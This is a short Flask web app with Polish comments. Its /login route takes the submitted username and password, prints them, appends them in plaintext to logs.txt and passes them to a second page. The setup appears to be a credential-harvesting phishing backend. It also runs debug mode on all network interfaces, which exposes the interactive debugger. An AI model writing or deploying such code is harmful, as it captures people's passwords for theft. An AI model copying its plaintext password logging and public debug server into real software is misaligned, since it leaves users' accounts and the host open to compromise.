from flask import Flask, request, render_template
import datetime

app = Flask(__name__)

def log_message(message):
    # Zapisuje logi na ekranie i do pliku logs.txt
    import datetime
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"

    # Drukowanie logu na ekranie
    print(log_entry)

    # Zapis do pliku logs.txt
    with open("logs.txt", "a") as log_file:
        log_file.write(log_entry + "\n")

@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    log_message(f"Login: {username}, Password: {password}")

    # Przekazujemy dane do szablonu
    return render_template("website.html", username=username, password=password)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
